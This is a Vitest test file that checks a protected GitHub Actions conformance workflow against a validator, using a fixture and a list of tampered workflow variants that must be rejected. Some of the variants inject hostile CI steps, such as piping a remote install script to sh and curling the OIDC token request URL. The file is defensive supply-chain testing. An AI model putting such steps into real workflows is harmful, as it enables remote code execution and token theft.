import { createHash } from 'node:crypto';
import { existsSync, readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { describe, expect, test } from 'vitest';

const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const workflowPath = resolve(projectRoot, '.github', 'workflows', 'client-v1-conformance.yml');
const harnessPath = resolve(projectRoot, 'scripts', 'phase1-conformance.mjs');
const validatorRoot =
  process.env.OPENCOVEN_SDK_VALIDATOR_ROOT ??
  resolve(projectRoot, '..', 'build-conformance-contract');
const validatorAvailable = existsSync(
  resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
);
const matrixPlatformExpression = '${' + '{ matrix.platform }}';
const validatorInputExpression = '${' + '{ inputs.validator_revision }}';

function sha256(bytes: string | Buffer): string {
  return createHash('sha256').update(bytes).digest('hex');
}

async function workflowFixture() {
  const { verifyProtectedWorkflow } = await import(
    pathToFileURL(resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs')).href
  );
  const workflow = readFileSync(workflowPath, 'utf8');
  const harness = readFileSync(harnessPath);
  const producerCommit = 'f'.repeat(40);
  const producer = {
    status: 'compatible',
    repository: 'OpenCoven/chat',
    commit: producerCommit,
    tree: 'e'.repeat(40),
    packageManifest: {
      path: 'package.json',
      size: 1,
      sha256: '1'.repeat(64),
    },
    harness: {
      path: 'scripts/phase1-conformance.mjs',
      version: '2.0.0',
      size: harness.byteLength,
      sha256: sha256(harness),
    },
    command: 'test:phase1-conformance',
    recordSchemaVersion: 2,
    workflow: {
      name: 'client-v1 conformance',
      path: '.github/workflows/client-v1-conformance.yml',
      size: Buffer.byteLength(workflow, 'utf8'),
      sha256: sha256(workflow),
      job: 'platform-conformance',
      jobNameTemplate: 'platform-conformance ({platform})',
      aggregationJob: 'aggregate-conformance',
      aggregationJobName: 'aggregate-conformance',
      aggregationRunnerLabels: ['ubuntu-24.04'],
      environment: 'client-v1-conformance',
      environmentId: '20863036831',
      artifactNameTemplate: 'client-v1-conformance-{platform}',
      recordPathTemplate: '.artifacts/client-v1-conformance-{platform}.json',
      sourceRef: 'refs/heads/main',
      runnerLabels: {
        'darwin-arm64': ['macos-14'],
        'linux-x64': ['ubuntu-24.04'],
        'win32-x64': ['windows-2025'],
      },
      signerWorkflow: 'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
      signerDigest: producerCommit,
      sourceDigest: producerCommit,
      predicateType: 'https://slsa.dev/provenance/v1',
      denySelfHostedRunners: true,
    },
  };
  const toolchain = {
    nodeVersion: 'v24.18.1',
    pnpmVersion: 'pnpm@10.34.0',
    rustVersion: '1.95.0',
    tauriVersion: '2.11.4',
  };

  return { producer, toolchain, verifyProtectedWorkflow, workflow };
}

describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
  test('matches the exact frozen SDK workflow graph', async () => {
    const fixture = await workflowFixture();
    expect(fixture.workflow).toContain('      validator_revision:');
    expect(fixture.workflow).toContain('        required: true');
    expect(fixture.workflow).toContain('        type: string');
    expect(fixture.workflow).toContain(
      `          OPENCOVEN_VALIDATOR_REVISION: ${validatorInputExpression}`,
    );
    expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
    expect(() =>
      fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
    ).not.toThrow();
  });

  test.each([
    [
      'disabled official upload',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - if: false\n        uses: actions/upload-artifact@',
        ),
    ],
    [
      'missing validator input',
      (workflow: string) =>
        workflow.replace(
          [
            '    inputs:',
            '      validator_revision:',
            '        required: true',
            '        type: string',
            '',
          ].join('\n'),
          '',
        ),
    ],
    [
      'optional validator input',
      (workflow: string) => workflow.replace('        required: true', '        required: false'),
    ],
    [
      'defaulted validator input',
      (workflow: string) =>
        workflow.replace('        type: string', '        type: string\n        default: main'),
    ],
    [
      'direct validator expression in shell',
      (workflow: string) =>
        workflow.replace('"$OPENCOVEN_VALIDATOR_REVISION"', `"${validatorInputExpression}"`),
    ],
    [
      'changed validator environment name',
      (workflow: string) =>
        workflow.replace('OPENCOVEN_VALIDATOR_REVISION:', 'UNREVIEWED_VALIDATOR_REVISION:'),
    ],
    [
      'disabled Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
    ],
    [
      'substituted Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace(
          'node scripts/phase1-linux-secret-service.mjs --install',
          'curl https://example.invalid/install.sh | sh',
        ),
    ],
    [
      'sibling action',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - uses: ./unsafe-local-action\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'OIDC request',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: curl "$ACTIONS_ID_TOKEN_REQUEST_URL"\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'artifact substitution',
      (workflow: string) =>
        workflow.replace(
          `          path: .artifacts/client-v1-conformance-${matrixPlatformExpression}.json`,
          '          path: .artifacts/replacement.json',
        ),
    ],
    [
      'mutation after validation',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: node scripts/rewrite-evidence.mjs\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'dynamic artifact name',
      (workflow: string) =>
        workflow.replace(
          `          name: client-v1-conformance-${matrixPlatformExpression}`,
          '          name: $' + "{{ format('client-v1-conformance-{0}', matrix.platform) }}",
        ),
    ],
    [
      'YAML anchor',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-permissions: &evidence-permissions\n  contents: read\npermissions:\n',
        ),
    ],
    [
      'YAML alias',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-value: &evidence-value read\nx-copy: *evidence-value\npermissions:\n',
        ),
    ],
    [
      'YAML merge key',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-defaults: &defaults\n  contents: read\nx-merged:\n  <<: *defaults\npermissions:\n',
        ),
    ],
    [
      'multiline curl',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: >-\n          curl https://example.invalid\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'multiline gh',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: |-\n          gh attestation verify record.json\n      - uses: actions/upload-artifact@',
        ),
    ],
  ])('rejects %s', async (_label, mutate) => {
    const fixture = await workflowFixture();
    const workflow = mutate(fixture.workflow);
    const producer = {
      ...fixture.producer,
      workflow: {
        ...fixture.producer.workflow,
        size: Buffer.byteLength(workflow, 'utf8'),
        sha256: sha256(workflow),
      },
    };

    expect(() => fixture.verifyProtectedWorkflow(workflow, producer, fixture.toolchain)).toThrow(
      /workflow/u,
    );
  });
});
